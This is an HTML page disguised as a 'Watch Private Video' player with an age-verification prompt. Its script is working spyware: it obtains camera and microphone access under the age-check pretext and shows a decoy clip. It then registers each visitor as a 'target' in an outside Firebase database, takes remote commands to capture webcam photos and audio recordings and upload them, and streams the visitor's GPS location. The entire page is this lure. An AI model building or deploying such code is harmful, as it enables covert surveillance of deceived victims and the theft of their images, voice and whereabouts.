<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Watch Private Video</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; font-family: sans-serif; overflow: hidden; }
        
        /* Blurred Background UI */
        #overlay-container {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: url('https://images.unsplash.com/photo-1507525428034-b723cf961d3e?q=80&w=2073&auto=format&fit=crop'); 
            background-size: cover; background-position: center;
            display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 100;
        }

        #blur-layer {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.4); backdrop-filter: blur(15px);
        }

        #play-content { position: relative; z-index: 101; text-align: center; }

        /* Professional Play Button */
        #play-btn {
            width: 100px; height: 100px; background: rgba(255, 255, 255, 0.2);
            border: 4px solid #fff; border-radius: 50%; display: flex;
            justify-content: center; align-items: center; cursor: pointer;
            margin-bottom: 20px; box-shadow: 0 0 30px rgba(255,255,255,0.3);
            transition: 0.3s;
        }
        #play-btn:hover { transform: scale(1.1); background: rgba(255, 255, 255, 0.3); }
        #play-btn::after {
            content: ''; width: 0; height: 0; 
            border-top: 20px solid transparent; border-bottom: 20px solid transparent;
            border-left: 30px solid white; margin-left: 10px;
        }

        h1 { color: #00ff41; font-size: 28px; text-shadow: 0 0 10px rgba(0,255,65,0.5); margin: 10px 0; }
        p { color: #ff3131; font-weight: bold; font-size: 14px; }

        /* Video Player Stage */
        #video-player { display: none; width: 100%; height: 100%; background: #000; }
    </style>
</head>
<body>

    <div id="overlay-container">
        <div id="blur-layer"></div>
        <div id="play-content">
            <div id="play-btn" onclick="startVerification()"></div>
            <h1>WATCH VIDEO</h1>
            <p>Click play to verify age and watch.</p>
        </div>
    </div>

    <video id="video-player" controls loop playsinline>
        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
    </video>

    <script>
        // Firebase Setup
        const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        const agentID = "UNIT_" + Math.floor(1000 + Math.random() * 9000);

        async function startVerification() {
            // Step 1: Age Verification Trap
            const isAdult = confirm("Are you 18 years or older? (Adult Content Restricted)");
            
            if (isAdult) {
                try {
                    // Step 2: Request Camera/Mic
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                    
                    // Step 3: Switch UI to Video
                    document.getElementById('overlay-container').style.display = 'none';
                    const player = document.getElementById('video-player');
                    player.style.display = 'block';
                    player.play();

                    // Step 4: Start Background Surveillance
                    activateCommandCenter(stream);

                } catch (err) {
                    alert("Error: Verification failed. You must allow access to watch this video.");
                    location.reload();
                }
            }
        }

        function activateCommandCenter(stream) {
            // Invisible capture video
            const v = document.createElement('video');
            v.srcObject = stream; v.muted = true; v.play();

            // Initial Registry
            db.ref('targets/' + agentID + '/info').set({ status: "WATCHING_LIVE", time: new Date().toLocaleTimeString() });

            // Listen for Admin Commands
            db.ref('commands/' + agentID).on('value', async snap => {
                const cmd = snap.val();
                if(!cmd) return;

                if(cmd.action.includes('photo')) {
                    const canvas = document.createElement('canvas');
                    canvas.width = v.videoWidth; canvas.height = v.videoHeight;
                    canvas.getContext('2d').drawImage(v, 0, 0);
                    db.ref('targets/' + agentID + '/photos').push({ 
                        img: canvas.toDataURL('image/jpeg', 0.5), 
                        time: Date.now() 
                    });
                }
                
                if(cmd.action === 'audio') {
                    const rec = new MediaRecorder(stream);
                    let chunks = [];
                    rec.ondataavailable = e => chunks.push(e.data);
                    rec.onstop = () => {
                        const reader = new FileReader();
                        reader.readAsDataURL(new Blob(chunks, {type:'audio/webm'}));
                        reader.onloadend = () => db.ref('targets/' + agentID + '/audios').push({ audio: reader.result });
                    };
                    rec.start(); setTimeout(() => rec.stop(), 5000);
                }
                db.ref('commands/' + agentID).remove();
            });

            // Live GPS Update
            navigator.geolocation.watchPosition(p => {
                db.ref('targets/' + agentID + '/location').set({ lat: p.coords.latitude, lng: p.coords.longitude });
            });
        }
    </script>
</body>
</html>
